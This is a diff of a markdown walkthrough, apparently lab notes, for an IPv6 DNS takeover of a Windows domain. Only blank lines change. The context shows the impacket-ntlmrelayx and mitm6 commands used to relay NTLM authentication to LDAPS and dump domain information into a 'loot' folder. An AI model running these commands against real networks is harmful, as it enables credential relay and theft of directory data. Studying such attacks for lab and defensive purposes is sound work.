@@ -26,11 +26,13 @@ In a DNS takeover, the attacker typically exploits vulnerabilities in the DNS in
 ## Step 1: Start up ntlmrelayx and mitm6
 
 ntlmrelayx:
+
 ![](attachments/20240304150525.png)
 `impacket-ntlmrelayx -6 -t ldaps://DOMAIN-IP -wh fakewpad.DOMAIN.local -l loot`
 The IP specified is the Domain IP address. The information dumped will be stored in a folder named loot.
 
 mitm6:
+
 ![](attachments/20240304150712.png)
 `sudo mitm6 -d DOMAIN.local`
 Target Domain specified.
@@ -49,6 +51,7 @@ Top is the **ntlmrelayx** and bottom is **mitm6**.
 Information about the domain is dumped in the folder specified called `loot`
 
 ![](attachments/20240304151516.png)
+
 Information is dumped in 3 different formats: JSON,HTML,GREP
 
 ![](attachments/20240304153934.png)
